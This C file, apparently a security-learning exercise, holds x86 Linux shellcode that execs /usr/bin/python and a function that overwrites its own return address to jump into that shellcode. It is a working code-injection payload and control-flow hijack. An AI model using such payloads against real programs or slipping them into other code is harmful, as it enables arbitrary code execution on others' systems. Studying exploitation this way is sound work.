/*************************************************************************
	> File Name: shellcode.c
	> Author: DevilBin 
	> Mail: whu.evil.binary@gmail.com 
	> Created Time: Sat 24 Oct 2015 12:46:19 PM CST
 ************************************************************************/

#include <stdio.h> 
#include <stdlib.h>

char shellcode[] = "\xe9\x2a\x00\x00\x00\x5b\xc6\x43\x0f\x00"
  "\x89\x5b\x10\xc7\x43\x14\x00\x00\x00\x00\xba\x00\x00\x00\x00"
  "\x8d\x4b\x10\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00"
  "\xb8\x01\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff/usr/bin/python";

void shell() {
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}

int main() {
    shell();
    return 0;
}
